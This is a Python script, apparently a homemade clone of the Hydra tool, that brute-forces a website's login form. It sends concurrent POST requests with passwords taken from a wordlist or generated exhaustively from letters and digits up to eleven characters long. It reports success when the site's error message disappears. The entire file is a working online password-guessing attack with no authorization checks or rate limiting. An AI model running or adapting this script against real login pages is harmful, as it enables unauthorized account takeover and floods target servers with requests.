import aiohttp
import asyncio
import argparse
import time
import sys
import os
import string
import requests
import itertools


class AsynchronousBrute:
    def __init__(self, website_url, username, fields, login_error, choice, start):
        self.url = website_url
        self.username = username
        self.user_field = fields[0]
        self.pass_field = fields[1]
        self.error = login_error
        self.choice = choice
        self.start = start

    async def fetch(self, session, password):
        payload = {self.user_field: self.username, self.pass_field: password}
        async with session.post(self.url, data=payload) as resp:
            text = await resp.text()
            print(
                f"\033[91mHost: {self.url} Login: {self.username} Password: {password}\033[0m"
            )

            if self.error not in text:
                end = time.time()
                print(
                    f"\033[92mLogin: {self.username}\nPassword: {password}\n\033[94mTime: {end - self.start}\033[0m\n"
                )
                print(f"Hydra finished work at {time.strftime('%X')}\n")

                os._exit(1)

    async def password_guessing(self):
        if self.choice[0] == "1":
            try:
                file = open(self.choice[1])
            except FileNotFoundError:
                print("Wrong file path...")
                os._exit(1)

            tasks = []
            async with aiohttp.ClientSession() as session:
                passwords = file.readlines()

                print(f"This file has {len(passwords)} passwords")

                for pswd in passwords:
                    password = pswd.strip()
                    task = asyncio.ensure_future(self.fetch(session, password))
                    tasks.append(task)

                await asyncio.gather(*tasks)
        else:
            charset = string.ascii_lowercase
            if self.choice[1] == "1":
                charset += string.digits

            if self.choice[2] == "2":
                charset += string.ascii_uppercase

            tasks = []
            async with aiohttp.ClientSession() as session:
                for length in range(1, 12):
                    for attempt in itertools.product(charset, repeat=length):
                        password = "".join(attempt)
                        task = asyncio.ensure_future(self.fetch(session, password))
                        tasks.append(task)
                        if len(tasks) == 100000:
                            await asyncio.gather(*tasks)
                            tasks.clear()


def website_check(website):
    try:
        responce = requests.get(website)

        return responce.status_code == 200
    except:
        return 0


async def main():
    os.system("clear")
    print(f"Hydra started work at {time.strftime('%X')}\n")

    parser = argparse.ArgumentParser(description="Hydra on python")
    required = parser.add_argument_group("Required arguments")

    required.add_argument("-u", "--url", dest="url")
    required.add_argument("-l", "--login", dest="username")
    required.add_argument("-f", "--fields", dest="fields")
    required.add_argument("-c", "--choice", dest="choice")

    args = parser.parse_args()

    website_url = args.url.strip()
    username = args.username
    fields = args.fields.split(":")
    choice = args.choice.split()

    if not website_check(website_url):
        print("Bad website name...")
        os._exit(1)

    login_error = fields[2]

    start = time.time()
    bruteForce = AsynchronousBrute(
        website_url, username, fields, login_error, choice, start
    )
    await bruteForce.password_guessing()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\033[94mKeyboard Interrupt!!!\033[0m")
        os._exit(1)
